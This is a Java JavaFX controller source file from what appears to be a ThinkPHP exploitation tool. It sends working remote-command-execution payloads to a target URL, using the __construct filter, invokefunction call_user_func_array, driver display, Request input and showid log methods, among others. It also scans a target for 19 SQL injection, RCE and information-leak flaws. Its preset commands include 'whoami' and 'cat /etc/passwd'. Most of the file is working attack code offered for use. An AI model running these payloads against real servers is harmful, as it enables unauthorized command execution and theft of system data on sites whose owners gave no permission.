
package com.leishianquan.view;

import com.jfoenix.controls.JFXButton;
import com.jfoenix.controls.JFXComboBox;
import com.jfoenix.controls.JFXTextArea;
import com.jfoenix.controls.JFXTextField;
import com.leishianquan.MainApp;

import com.leishianquan.exp.*;

import com.leishianquan.model.BasePayload;
import com.leishianquan.thinkphpexp.*;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;
import com.leishianquan.util.Tools;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;

import java.time.LocalDate;
import java.time.format.DateTimeFormatter;


public class VulnOverviewController {

    /**
     * 种类
     */
    @FXML
    private JFXComboBox<String> Vulncbx;

    /**
     * 检测
     */
    @FXML
    private JFXButton jbtn_strat;

    /**
     * 批量检测
     */
    @FXML
    private JFXButton bothjbtn_strat;

    /**
     * url
     */
    @FXML
    private JFXTextField url;

    /**
     * 命令
     */
    @FXML
    private  JFXComboBox<String> exec_commond;

    /**
     * 命令
     */
    @FXML
    private JFXButton exec_btn;

    /**
     * 命令
     */
    @FXML
    private JFXButton clear;


    /**
     * 结果
     */
    @FXML
    private JFXTextArea result_text;

    // Reference to the main application.
    private MainApp mainApp;



    /**
     * 检测漏洞动作
     */
    @FXML
    private void handlevuln_strat() {
        boolean isok = Tools.checkTheURL(this.url.getText());
        if (isok) {
            dispatch('c');
        } else {
            Dialog.alert_Dialog("URL检查",null,"URL格式不符合要求，示例：http://127.0.0.1:8080/");
        }
        this.jbtn_strat.setDisable(false);
    }

    /**
     * 批量检测漏洞动作
     */
    @FXML
    private void bothvuln_code() {
        boolean isok = Tools.checkTheURL(this.url.getText());
        if (isok) {
            dispatch('a');
        } else {
            Dialog.alert_Dialog("URL检查",null,"URL格式不符合要求，示例：http://127.0.0.1:8080/");
        }
        this.bothjbtn_strat.setDisable(false);
    }

        /**
         * 执行命令动作
         */
    @FXML
    private void handlexec_code() {
        String url = this.url.getText();
        String commond = exec_commond.getValue();
        String result = null;
        if (Vulncbx.getValue().contentEquals("thinkphp 5.0.23 命令执行")) {
            try {
                result = HttpTool.postHttpRequest(url + "/index.php?s=captcha","utf-8","application/x-www-form-urlencoded", "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]="+commond);
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            String str = result.substring(0, result.indexOf("<!"));
            try {
                log(str);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }


        }
        else if (Vulncbx.getValue().contentEquals("thinkphp 5.0.23 debug模式")){
            try {
                result = HttpTool.postHttpRequest(url + "/index.php" , "utf-8","application/x-www-form-urlencoded", "_method=__construct&filter[]=system&server[REQUEST_METHOD]="+commond);
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            String str = result.substring(0, result.indexOf("<!"));
            try {
                log(str);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }
        }
        else if (Vulncbx.getValue().contentEquals("thinkphp 5.* driver_display命令执行")){
            try {
                result = HttpTool.getHttpReuest(url + "/index.php?s=index/\think\\view\\driver\\Php/display&content=display&content=%3C?php%20exec(system("+commond+"));?%3E","utf-8");
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            String str = result.substring(0, result.indexOf("<!"));
            try {
                log(str);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }
        }
        else if (Vulncbx.getValue().contentEquals("thinkphp 5.0.10 construct命令执行")){
            try {
                result = HttpTool.postHttpRequest(url + "/index.php?s=index/index/index","utf-8","application/x-www-form-urlencoded","s=exec(system("+commond+"))"+"&_method=__construct&method&filter[]=system");
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            String str = result.substring(0, result.indexOf("<!"));
            try {
                log(str);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }
        }
        else if (Vulncbx.getValue().contentEquals("thinkphp 5.* showid命令执行")){
            try {
            HttpTool.getHttpReuest(url + "/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~system("+commond+")}]", "utf-8");
            LocalDate date = LocalDate.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yy_MM_dd");
            result= HttpTool.getHttpReuest(url + "/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C"+date.format(formatter)+".log'", "utf-8");
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            try {
                log(result);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }
        }
        else if (Vulncbx.getValue().contentEquals("thinkphp 5.* invokefunction命令执行")){
            try {
                result = HttpTool.getHttpReuest(url + "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="+commond, "utf-8");
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            try {
                log(result);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }
        }
        else if (Vulncbx.getValue().contentEquals("thinkphp 2.1 lite命令执行")){
            try {
                result = HttpTool.getHttpReuest(url + "/index.php/module/action/param1/{${system($_GET['x'])}}?x="+commond, "utf-8");
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            try {
                log(result);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }
        }
        else if (Vulncbx.getValue().contentEquals("thinkphp 5.* filter命令执行")){
            try {
                result = HttpTool.postHttpRequest(url + "/index.php", "utf-8",null,"c=exec&f=system("+commond+")&_method=filter");
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            try {
                log(result);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }
        }
        else if (Vulncbx.getValue().contentEquals("thinkphp 5.1.* input命令执行")){
            try {
                result = HttpTool.getHttpReuest(url + "/index.php?s=index/\\think\\Request/input&filter=exec&data=system("+commond+")", "utf-8");
            } catch (Exception e) {
                Dialog.alert_Dialog("错误",null,"执行命令失败");
            }
            try {
                log(result);
            }catch (Exception ex){
                Dialog.alert_Dialog("错误",null,"输出失败");
            }
        }




        this.exec_btn.setDisable(false);
    }



    @FXML
    private void clear() {
        this.result_text.clear();
    }

    public void log(String info) {
        this.result_text.appendText(info + "\r\n");
    }

    public void dispatch(char method) {
        String url = this.url.getText();
        String vulName = this.Vulncbx.getValue();
        try {
            BasePayload bp = Tools.getPayload(vulName);
            final BasePayload a  = new thinkphp_checkcode_time_sqli();
            final BasePayload b = new thinkphp_construct_debug_rce();
            final BasePayload c = new thinkphp_construct_code_exec();
            final BasePayload d = new thinkphp_debug_index_ids_sqli();
            final BasePayload e = new thinkphp_driver_display_rce();
            final BasePayload f = new thinkphp_index_construct_rce();
            final BasePayload g = new thinkphp_index_showid_rce();
            final BasePayload h = new thinkphp_invoke_func_code_exec();
            final BasePayload i = new thinkphp_lite_code_exec();
            final BasePayload j = new thinkphp_method_filter_code_exec();
            final BasePayload k = new thinkphp_multi_sql_leak();
            final BasePayload l = new thinkphp_pay_orderid_sqli();
            final BasePayload m = new thinkphp_request_input_rce();
            final BasePayload n = new thinkphp_view_recent_xff_sqli();
            final BasePayload o = new templalte_driver_rce();
            final BasePayload p = new container_invoke();
            final BasePayload q = new thinkphp_update_sql();
            final BasePayload r = new thinkphp_cache();
            final BasePayload s = new thinkphp_log();

            final boolean isVul1 = a.checkVUL(url);
            final boolean isVul2 = b.checkVUL(url);
            final boolean isVul3 = c.checkVUL(url);
            final boolean isVul4 = d.checkVUL(url);
            final boolean isVul5 = e.checkVUL(url);
            final boolean isVul6 = f.checkVUL(url);
            final boolean isVul7 = g.checkVUL(url);
            final boolean isVul8 = h.checkVUL(url);
            final boolean isVul9 = i.checkVUL(url);
            final boolean isVul10 = j.checkVUL(url);
            final boolean isVul11 = k.checkVUL(url);
            final boolean isVul12 = l.checkVUL(url);
            final boolean isVul13 = m.checkVUL(url);
            final boolean isVul14 = n.checkVUL(url);
            final boolean isVul15 = o.checkVUL(url);
            final boolean isVul16 = p.checkVUL(url);
            final boolean isVul17 = q.checkVUL(url);
            final boolean isVul18 = r.checkVUL(url);
            final boolean isVul19 = s.checkVUL(url);


            switch (method) {
                case 'a':{
                    if (isVul1) {
                        this.log(url + "存在thinkphp 时间盲注漏洞！");
                    }
                    if (isVul2) {
                        this.log(url + "存在thinkphp 5.0.23 debug命令执行漏洞！");
                    }
                    if (isVul3) {
                        this.log(url + "存在thinkphp 5.0.23 命令执行漏洞！");
                    }
                    if (isVul4) {
                        this.log(url + "存在Thinkphp 3.x order by 注入漏洞！");
                    }
                    if (isVul5) {
                        this.log(url + "存在thinkphp 5.* driver_display命令执行漏洞！");
                    }
                    if (isVul6) {
                        this.log(url + "存在thinkphp 5.0.10 construct命令执行漏洞！");
                    }
                    if (isVul7) {
                        this.log(url + "存在thinkphp 5.* showid命令执行漏洞！");
                    }
                    if (isVul8) {
                        this.log(url + "存在thinkphp 5.* invokefunction命令执行漏洞！");
                    }
                    if (isVul9) {
                        this.log(url + "存在thinkphp 2.1 lite命令执行漏洞！");
                        break;
                    }
                    if (isVul10) {
                        this.log(url + "存在thinkphp 5.* filter命令执行漏洞！");
                        break;
                    }
                    if (isVul11) {
                        this.log(url + "存在thinkphp multi注入漏洞！");
                        break;
                    }
                    if (isVul12) {
                        this.log(url + "存在thinkphp orderid注入漏洞！");
                        break;
                    }
                    if (isVul13) {
                        this.log(url + "存在thinkphp 5.1.* input命令执行漏洞！");
                        break;
                    }
                    if (isVul14) {
                        this.log(url + "存在thinkphp X_Forwarded_For注入漏洞！");
                        break;
                    }
                    if (isVul15) {
                        this.log(url + "存在thinkphp 5.* templalte命令执行漏洞！");
                        break;
                    }
                    if (isVul16) {
                        this.log(url + "存在thinkphp 5.* container命令执行漏洞！");
                        break;
                    }
                    if (isVul17) {
                        this.log(url + "存在Thinkphp 3.2.3 update注入漏洞！");
                        break;
                    }
                    if (isVul18) {
                        this.log(url + "存在Thinkphp 3.2.3 缓存命令执行漏洞！");
                        break;
                    }
                    if (isVul19) {
                        this.log(url + "存在Thinkphp 日志泄露漏洞！");
                        break;
                    }

                    this.log(url + "检测完毕！");
                    break;
            }


                case 'c':
                    boolean isVul = bp.checkVUL(url);
                    if (isVul) {
                        log(url + "存在漏洞！");

                    } else {
                        log(url + "不存在漏洞！");
                        Dialog.alert_Dialog("txf提示你",null,"不存在漏洞");
                    }
                    break;
            }



        } catch (Exception e) {
            e.printStackTrace();
        }
    }

//
//
    public void setMainApp(MainApp mainApp) {

        /*
        漏洞
         */
            this.mainApp = mainApp;
            ObservableList<String> options =
                    FXCollections.observableArrayList(
                            "thinkphp 时间盲注",
                            "thinkphp 5.0.23 debug模式",
                            "thinkphp 5.0.23 命令执行",
                            "ThinkPHP5 SQL注入漏洞 && 敏感信息泄露",
                            "thinkphp 5.* driver_display命令执行",
                            "thinkphp 5.0.10 construct命令执行",
                            "thinkphp 5.* showid命令执行",
                            "thinkphp 5.* invokefunction命令执行",
                            "thinkphp 2.1 lite命令执行",
                            "thinkphp 5.* filter命令执行",
                            "thinkphp multi注入",
                            "thinkphp orderid注入",
                            "thinkphp 5.1.* input命令执行",
                            "thinkphp X_Forwarded_For注入",
                            "thinkphp 5.* templalte命令执行",
                            "thinkphp 5.* container命令执行",
                            "Thinkphp 3.2.3 update注入漏洞",
                            "Thinkphp 3.2.3 缓存命令执行",
                            "Thinkphp 日志泄露漏洞"
                    );
                    Vulncbx.setItems(options);
                    Vulncbx.setValue("thinkphp 5.0.23 命令执行");

        /*
        命令
         */
        ObservableList<String> comm = FXCollections.observableArrayList("whoami", "id","ifconfig", "ipconfig","cat /etc/passwd");
                    exec_commond.setItems(comm);
                    exec_commond.setValue("whoami");
            }
}